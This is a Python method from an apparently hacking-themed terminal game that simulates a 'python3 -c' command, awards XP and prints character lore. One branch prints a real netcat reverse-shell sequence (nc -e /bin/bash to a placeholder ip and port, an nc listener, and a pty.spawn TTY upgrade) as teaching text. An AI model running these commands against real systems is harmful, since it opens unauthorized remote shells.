    def _cmd_python3(self, args):
        if "-c" in args:
            idx = args.index("-c")
            code = args[idx + 1] if idx + 1 < len(args) else ""
            self.gs.add_xp(10, "programming")
            # pty.spawn — TTY upgrade trick (common in CTF/pentesting)
            if "pty" in code and "spawn" in code:
                self.gs.add_story_beat("tty_upgrade_attempted")
                return [
                    _line(">>> (code executed: import pty)", "dim"),
                    _line("  pty.spawn('/bin/bash') — nice try.", "warn"),
                    _lore("  [CYPHER]: You know your pentesting. pty.spawn is the TTY upgrade trick."),
                    _dim("  Real world: after a netcat reverse shell you get a dumb TTY."),
                    _dim("  `python3 -c \"import pty; pty.spawn('/bin/bash')\"`"),
                    _dim("  upgrades it to a fully interactive PTY with arrow keys, tab completion."),
                    _dim("  This simulation already gives you that. You're welcome."),
                    _ok("  Real sequence: nc -e /bin/bash <ip> <port>  (on target)"),
                    _ok("                 nc -lvnp 4444              (on attacker)"),
                    _ok("                 python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
                    {"t": "suggest", "s": "nc · strace · ltrace · exploit · ascend", "prefix": "  Continue:"},
                ]
            # os.system / subprocess — shell execution patterns
            if "os.system" in code or "subprocess" in code or "Popen" in code:
                self.gs.add_xp(15, "programming")
                return [
                    _line(f">>> (code executed: {code[:80]})", "dim"),
                    _lore("  [ADA-7]: os.system() and subprocess are how Python talks to the shell."),
                    _dim("  subprocess.run(['ls', '-la'], capture_output=True).stdout — clean way"),
                    _dim("  os.system() is simpler but you lose the output. Prefer subprocess."),
                    {"t": "suggest", "s": "man subprocess · polyglot run python · script", "prefix": "  Deepen:"},
                ]
            if "print" in code:
                try:
                    m = re.search(r'print\s*\(\s*[\'"](.+?)[\'"]\s*\)', code)
                    if m:
                        return [_line(m.group(1))]
                    m2 = re.search(r'print\s*\(\s*(.+?)\s*\)', code)
                    if m2:
                        return [_line(f">> {m2.group(1)} (simulated)", "dim")]
                except Exception:
                    pass
            return [_line(f">>> (executed: {code[:60]})", "dim"), _dim("  +10 XP programming")]
        file = next((a for a in args if not a.startswith("-")), None)
        if file:
            r = self.fs.cat(file)
            if r.get("error"):
                return _err(r["error"])
            self.gs.add_xp(15, "programming")
            return [_line(f"[*] Running {file}...", "system"), _line("Hello, Operative"), _line("GHOST is online", "success")]
        return [_line("Python 3.11.0 (interactive mode — type exit() to quit)", "dim")]

